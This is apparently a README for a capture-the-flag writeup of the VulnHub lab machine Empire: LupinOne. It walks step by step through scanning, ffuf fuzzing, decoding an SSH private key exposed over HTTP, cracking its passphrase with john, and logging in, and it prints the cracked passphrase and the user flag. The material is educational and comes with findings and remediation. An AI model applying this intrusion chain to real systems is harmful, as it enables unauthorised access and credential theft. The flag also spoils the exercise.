# Empire: LupinOne — Penetration Test Writeup

A black-box, user-level walkthrough of the **Empire: LupinOne** machine
([VulnHub](https://www.vulnhub.com/entry/empire-lupinone,750/)), by
*icex64 & Empire Cybersecurity*. Recon → web enumeration → credential
cracking → SSH foothold → **user flag**, fully documented with screenshots.

> ⚠️ **Educational / lab use only.** Everything here was performed against an
> intentionally vulnerable VM on an isolated host-only network. Do not apply
> these techniques to systems you do not own or have explicit written
> permission to test. The target IP is redacted as `<target ip>` throughout.

---

## 📂 Repository Structure

```
Empire-LupinOne-Pentest/
├── README.md                     # this file — project overview & structure
├── Empire-LupinOne-Report.pdf    # full penetration test report (PDF)
└── images/                       # screenshots referenced by the report
    ├── 01-target-vm-network.png      # target VM — host-only network config
    ├── 02-kali-vm-network.png        # attacker VM — host-only network config
    ├── 04-netdiscover.png            # host discovery
    ├── 05-nmap-quick.png             # initial nmap scan (22, 80)
    ├── 06-nmap-full.png              # full nmap -sV -sS -sC
    ├── 07-web-root.png               # web root page
    ├── 08-robots-txt.png             # robots.txt (Disallow /~myfiles)
    ├── 09-myfiles-404.png            # /~myfiles decoy (404)
    ├── 10-ffuf-dirs-setup.png        # ffuf directory fuzzing
    ├── 11-ffuf-secret-found.png      # /~secret/ discovered
    ├── 12-secret-directory.png       # note inside /~secret/
    ├── 13-ffuf-files-setup.png       # ffuf hidden-file fuzzing
    ├── 14-ffuf-mysecret-found.png    # .mysecret.txt discovered
    ├── 15-base58-blob.png            # encoded blob
    ├── 16-base58-decoded-key.png     # Base58 → OpenSSH key
    ├── 17-ssh2john.png               # ssh2john conversion
    ├── 19-john-permission.png        # john re-run with sudo
    ├── 20-john-cracked.png           # passphrase cracked
    ├── 21-ssh-key-attempt.png        # SSH key login attempt
    ├── 22-ssh-success.png            # successful SSH login (icex64)
    └── 24-user-flag.png              # user.txt captured
```

---

## 📄 The Report

The full report — executive summary, scope, methodology, findings with severity
ratings, the complete kill chain, and remediation — is in
**[Empire-LupinOne-Report.pdf](Empire-LupinOne-Report.pdf)**.

---

## 🎯 Target

| | |
|---|---|
| Box | Empire: LupinOne (VulnHub) |
| Host | `<target ip>` |
| OS | Debian 11 (Linux 5.10) |
| Difficulty | Medium |
| Services | `22/tcp` OpenSSH 8.4p1 · `80/tcp` Apache 2.4.48 |

---

## 🧭 Attack Chain at a Glance

```
netdiscover / nmap
        │  22 (ssh), 80 (http)
        ▼
robots.txt → /~myfiles (404 decoy)
        │
        ▼
ffuf  /~FUZZ           →  /~secret/  (301)
        │
        ▼
ffuf  /~secret/.FUZZ   →  .mysecret.txt  (hidden dot-file)
        │
        ▼
Base58 decode          →  OpenSSH private key (id_rsa)
        │
        ▼
ssh2john + john (fasttrack.txt)  →  passphrase: P@55w0rd!
        │
        ▼
chmod 600 + ssh -i id_rsa icex64@<target ip>   →  shell as icex64
        │
        ▼
      user.txt  ✅  captured
```

---

## 🔑 Key Takeaways

- **A private key was exposed over HTTP** — encoding (Base58) is not protection.
- **The passphrase was weak** (`fasttrack.txt`-crackable in ~1s).
- **`robots.txt` and naming conventions leaked structure**, and even a decoy narrowed the search.
- The compromise required *every* weak link — fixing any one breaks the chain.

---

## 🧪 Full Command Walkthrough

Every command used in the engagement, with inline comments. Replace `<target ip>`
with the machine's actual address on your lab network.

### 1 · Reconnaissance

```bash
# Discover live hosts on the local (host-only) segment via ARP.
# Reveals the target's IP without touching it noisily.
sudo netdiscover

# Quick default TCP scan — which ports are open?
# Result here: 22/tcp (ssh) and 80/tcp (http).
nmap <target ip>

# Deep scan of the two known ports:
#   -sS  SYN (stealth) scan
#   -sV  service/version detection (OpenSSH 8.4p1, Apache 2.4.48)
#   -sC  default NSE scripts (pulls http-robots.txt -> /~myfiles)
nmap -sV -sS -sC <target ip>
```

### 2 · Web Enumeration

```bash
# Read the robots.txt hinted at by nmap.
# It disallows /~myfiles ... which turns out to be a 404 decoy.
curl http://<target ip>/robots.txt

# The '~' prefix screams Apache userdir. Fuzz for real userdir names.
#   -w   wordlist
#   -c   colourised output
#   -ic  ignore wordlist comment lines
#   -fc 403   filter out 403 responses (noise)
# -> finds "secret" (HTTP 301), i.e. /~secret/
ffuf -u http://<target ip>/~FUZZ \
     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
     -c -ic -fc 403

# View the /~secret/ page — it contains a note from "icex64" saying an
# SSH private key is HIDDEN in this directory and the passphrase is
# crackable with "fasttrack". Two big hints in one message.
curl http://<target ip>/~secret/

# Fuzz again, this time for HIDDEN files (leading dot) inside /~secret/:
#   -e .txt,.html   also try these extensions on each word
# -> finds .mysecret.txt (HTTP 200, size 4689)
ffuf -u http://<target ip>/~secret/.FUZZ \
     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
     -c -ic -fc 403 \
     -e .txt,.html
```

### 3 · Credential Access (recover & crack the SSH key)

```bash
# Grab the hidden file. It's ONE long high-entropy line — an encoded blob,
# not a raw key. Character set (no 0/O/I/l) => Base58.
curl http://<target ip>/~secret/.mysecret.txt

# Base58-decode the blob to recover the OpenSSH private key.
# (Done via an online Base58 decoder, or the CLI below.)
# Save the decoded output as id_rsa.
curl -s http://<target ip>/~secret/.mysecret.txt | base58 -d > id_rsa
#   ^ if the 'base58' tool isn't installed:  pip install base58   (or use an online decoder)

# The key is passphrase-protected. Convert it to a John-crackable hash.
ssh2john id_rsa > hash.txt

# Crack the passphrase using the author-hinted 'fasttrack' wordlist.
# (First run without sudo may hit "Permission denied" on the wordlist path —
#  re-run with sudo as shown.)
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
#   -> recovered passphrase:  P@55w0rd!

# (Optional) redisplay the cracked passphrase later:
john --show hash.txt
```

### 4 · Initial Access (SSH foothold)

```bash
# SSH rejects world-readable private keys with "bad permissions".
# Lock the key down to owner-read/write only.
chmod 600 id_rsa

# Log in with the recovered key as icex64 (username came from the note).
# When prompted for the key passphrase, enter:  P@55w0rd!
ssh -i id_rsa icex64@<target ip>
```

### 5 · User Flag

```bash
# Now on the box as icex64 — read the user flag from the home directory.
cat user.txt
#   -> 3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
```

---

## 🛠️ Tools Used

`netdiscover` · `nmap` · `ffuf` · `ssh2john` · `john` · Base58 decoder · `ssh`

---

## 🚩 Findings Summary

| # | Finding | Severity |
|---|---|---|
| F-01 | SSH private key exposed on the public web server | Critical |
| F-02 | Weak passphrase on the SSH private key | High |
| F-03 | Sensitive content hidden by obscurity only | Medium |
| F-04 | Information disclosure via robots.txt / naming | Low |
| F-05 | Verbose service / version banners | Informational |

---

## 📚 Skills Demonstrated

Network & service enumeration · Apache *userdir* discovery · content / hidden-file
fuzzing · encoding recognition & decoding · SSH key cracking · structured reporting
with remediation.

---

*Author: Kenil · Lab environment: Kali Linux vs. Empire: LupinOne (VMware host-only)*
